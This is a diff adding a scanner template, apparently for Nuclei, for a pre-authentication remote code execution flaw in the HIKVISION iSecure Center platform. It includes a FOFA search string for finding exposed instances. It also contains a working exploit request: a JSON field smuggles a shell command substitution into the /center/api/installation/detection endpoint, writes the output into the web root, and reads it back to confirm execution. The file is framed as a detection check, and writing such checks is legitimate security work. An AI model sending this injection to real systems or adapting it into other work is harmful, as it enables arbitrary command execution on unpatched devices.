@@ -1,0 +1,37 @@
+id: hikvision-detection-rce
+
+info:
+  name: 海康威视综合安防管理平台 detection 前台RCE
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: app="HIKVISION-iSecure-Center"
+
+  tags: RCE
+
+variables:
+  username: "{{to_lower(rand_base(6))}}"
+
+http:
+  - raw:
+      - |
+        POST /center/api/installation/detection HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"type":"environment","operate":"","machines":{"id":  "$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/{{username}}.txt)"}}
+
+      - |
+        GET /vms/static/{{username}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid'
+          - 'gid'
+      - type: status
+        status: 
+          - 200
